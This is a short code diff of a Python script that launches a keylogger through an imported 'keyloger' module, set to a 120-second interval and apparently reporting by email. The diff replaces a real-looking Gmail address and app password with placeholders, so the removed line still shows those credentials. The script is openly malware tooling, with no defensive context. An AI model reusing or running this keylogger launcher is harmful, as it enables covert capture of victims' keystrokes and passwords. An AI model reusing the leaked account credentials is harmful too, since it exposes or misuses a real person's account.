@@ -1,4 +1,4 @@
 import keyloger
 
-run_keylogger = keyloger.Keylogger(120, "kaliwolf2212@gmail.com", "hiwgivilyvkuohtb")
+run_keylogger = keyloger.Keylogger(120, "gmail", "password")
 run_keylogger.start()
